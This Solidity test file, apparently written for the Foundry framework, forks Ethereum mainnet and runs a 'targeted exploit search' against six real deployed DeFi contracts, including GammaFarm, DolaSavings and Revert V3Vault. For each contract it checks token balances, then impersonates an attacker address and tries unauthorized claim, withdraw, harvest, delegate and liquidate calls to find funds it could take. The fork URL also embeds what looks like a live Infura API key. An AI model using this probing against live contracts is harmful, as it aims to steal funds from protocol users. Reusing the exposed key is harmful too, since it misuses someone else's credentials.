// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Targeted Exploit Search
 * @notice Focus on specific high-value targets with known attack patterns
 */
contract TargetedExploitTest is Test {
    // Use vm.parseAddress to avoid checksum issues

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function test_exploitGammaFarm() public {
        // GammaFarm - might have unchecked profit factor
        address target = vm.parseAddress("0x5Dc58f812b2e244DABA2fabd33f399cD699D7Ddc");
        address attacker = address(0xBEEF);

        console.log("=== GAMMAFARM EXPLOIT TEST ===");
        console.log("Target:", target);

        // Check what tokens this holds
        address[] memory tokens = new address[](3);
        tokens[0] = vm.parseAddress("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"); // WETH
        tokens[1] = vm.parseAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"); // USDC
        tokens[2] = vm.parseAddress("0x6B175474E89094C44Da98b954EedeAC495271d0F"); // DAI

        for (uint i = 0; i < tokens.length; i++) {
            (bool s, bytes memory d) = tokens[i].staticcall(
                abi.encodeWithSignature("balanceOf(address)", target)
            );
            if (s && d.length >= 32) {
                uint256 bal = abi.decode(d, (uint256));
                if (bal > 0) {
                    console.log("Token", i, "balance:", bal);
                }
            }
        }

        // Check profitFactor
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("profitFactor()")
        );
        if (s && d.length >= 32) {
            uint256 pf = abi.decode(d, (uint256));
            console.log("profitFactor:", pf);
        }

        // Try to harvest with manipulated profit
        vm.startPrank(attacker);

        // Try direct harvest
        (s,) = target.call(abi.encodeWithSignature("harvest()"));
        console.log("harvest():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("collectProfits()"));
        console.log("collectProfits():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();
    }

    function test_exploitDolaSavings() public {
        // DolaSavings - DBR yield
        address target = vm.parseAddress("0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4");
        address attacker = address(0xBEEF);

        console.log("=== DOLASAVINGS EXPLOIT TEST ===");
        console.log("Target:", target);

        // Get DBR token
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("dbr()")
        );
        address dbr;
        if (s && d.length >= 32) {
            dbr = abi.decode(d, (address));
            console.log("DBR:", dbr);
        }

        // Get DOLA token
        (s, d) = target.staticcall(
            abi.encodeWithSignature("dola()")
        );
        address dola;
        if (s && d.length >= 32) {
            dola = abi.decode(d, (address));
            console.log("DOLA:", dola);
        }

        // Check total supply and TVL
        (s, d) = target.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (s && d.length >= 32) {
            uint256 ts = abi.decode(d, (uint256));
            console.log("Total Supply:", ts / 1e18);
        }

        // Check DBR balance in savings
        if (dbr != address(0)) {
            (s, d) = dbr.staticcall(
                abi.encodeWithSignature("balanceOf(address)", target)
            );
            if (s && d.length >= 32) {
                uint256 dbrBal = abi.decode(d, (uint256));
                console.log("DBR Balance:", dbrBal);
            }
        }

        // Check pending rewards
        (s, d) = target.staticcall(
            abi.encodeWithSignature("claimable(address)", attacker)
        );
        if (s && d.length >= 32) {
            uint256 claimable = abi.decode(d, (uint256));
            console.log("Claimable for attacker:", claimable);
        }

        vm.startPrank(attacker);

        // Try claim without deposit
        (s,) = target.call(abi.encodeWithSignature("claim(address)", attacker));
        console.log("claim(attacker):", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claimDBR()"));
        console.log("claimDBR():", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();
    }

    function test_exploitRewardVault() public {
        // Chainlink RewardVault - holds LINK
        address target = vm.parseAddress("0x996913c8c08472f584ab8834e925b06D0eb1D813");
        address attacker = address(0xBEEF);
        address LINK = vm.parseAddress("0x514910771AF9Ca656af840dff83E8264EcF986CA");

        console.log("=== REWARDVAULT EXPLOIT TEST ===");
        console.log("Target:", target);

        // Check LINK balance
        (bool s, bytes memory d) = LINK.staticcall(
            abi.encodeWithSignature("balanceOf(address)", target)
        );
        if (s && d.length >= 32) {
            uint256 linkBal = abi.decode(d, (uint256));
            console.log("LINK Balance:", linkBal / 1e18);
        }

        // Check ETH balance
        console.log("ETH Balance:", target.balance / 1e18);

        vm.startPrank(attacker);

        // Try various claim/withdraw functions
        (s,) = target.call(abi.encodeWithSignature("claimReward()"));
        console.log("claimReward():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("getReward()"));
        console.log("getReward():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1e18));
        console.log("withdraw(1e18):", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();
    }

    function test_exploitVeiZi() public {
        // veiZi - veToken with rewards
        address target = vm.parseAddress("0x1d3898a5a5CCe53773104E65fFDe1743aE29766c");
        address attacker = address(0xBEEF);

        console.log("=== VEIZI EXPLOIT TEST ===");
        console.log("Target:", target);

        // Check reward token
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("rewardToken()")
        );
        if (s && d.length >= 32) {
            address rt = abi.decode(d, (address));
            console.log("Reward Token:", rt);

            // Check reward balance
            (s, d) = rt.staticcall(
                abi.encodeWithSignature("balanceOf(address)", target)
            );
            if (s && d.length >= 32) {
                uint256 bal = abi.decode(d, (uint256));
                console.log("Reward Balance:", bal / 1e18);
            }
        }

        vm.startPrank(attacker);

        (s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("collectReward()"));
        console.log("collectReward():", s ? "SUCCESS" : "FAILED");

        (s,) = target.call(abi.encodeWithSignature("getReward()"));
        console.log("getReward():", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();
    }

    function test_exploitWDYDX() public {
        // wDYDX - wrapped governance token
        address target = vm.parseAddress("0x46b2DeAe6eFf3011008EA27EA36b7c27255ddFA9");
        address attacker = address(0xBEEF);

        console.log("=== WDYDX EXPLOIT TEST ===");
        console.log("Target:", target);

        // Check total supply
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (s && d.length >= 32) {
            uint256 ts = abi.decode(d, (uint256));
            console.log("Total Supply:", ts / 1e18);
        }

        // Check snapshot mechanism
        (s, d) = target.staticcall(
            abi.encodeWithSignature("getCurrentSnapshotId()")
        );
        if (s && d.length >= 32) {
            uint128 snapId = abi.decode(d, (uint128));
            console.log("Current Snapshot ID:", uint256(snapId));
        }

        // Try to manipulate snapshots
        vm.startPrank(attacker);

        // Try _writeSnapshot
        (s,) = target.call(abi.encodeWithSignature("_writeSnapshot()"));
        console.log("_writeSnapshot():", s ? "SUCCESS" : "FAILED");

        // Try delegate
        (s,) = target.call(abi.encodeWithSignature("delegate(address)", attacker));
        console.log("delegate(attacker):", s ? "SUCCESS" : "FAILED");

        // Check power after delegate
        (s, d) = target.staticcall(
            abi.encodeWithSignature("getPowerCurrent(address,uint8)", attacker, 0)
        );
        if (s && d.length >= 32) {
            uint256 power = abi.decode(d, (uint256));
            console.log("Attacker power:", power);
        }

        vm.stopPrank();
    }

    function test_exploitV3Vault() public {
        // Revert V3Vault - NFT positions
        address target = vm.parseAddress("0x74826FE70A49AF1ae0A5f6C9fD5F72ed24E51904");
        address attacker = address(0xBEEF);

        console.log("=== V3VAULT EXPLOIT TEST ===");
        console.log("Target:", target);

        // Check ETH balance
        console.log("ETH Balance:", target.balance / 1e18);

        // Check asset
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("asset()")
        );
        if (s && d.length >= 32) {
            address asset = abi.decode(d, (address));
            console.log("Asset:", asset);

            // Check asset balance
            (s, d) = asset.staticcall(
                abi.encodeWithSignature("balanceOf(address)", target)
            );
            if (s && d.length >= 32) {
                uint256 bal = abi.decode(d, (uint256));
                console.log("Asset Balance:", bal);
            }
        }

        // Check totalAssets
        (s, d) = target.staticcall(
            abi.encodeWithSignature("totalAssets()")
        );
        if (s && d.length >= 32) {
            uint256 ta = abi.decode(d, (uint256));
            console.log("Total Assets:", ta);
        }

        vm.startPrank(attacker);

        // Try liquidate without collateral
        (s,) = target.call(abi.encodeWithSignature("liquidate(uint256,uint256)", 0, 0));
        console.log("liquidate(0,0):", s ? "SUCCESS" : "FAILED");

        // Try transform
        (s,) = target.call(
            abi.encodeWithSignature("transform(uint256,address,bytes)", 0, attacker, "")
        );
        console.log("transform(0,attacker):", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();
    }
}
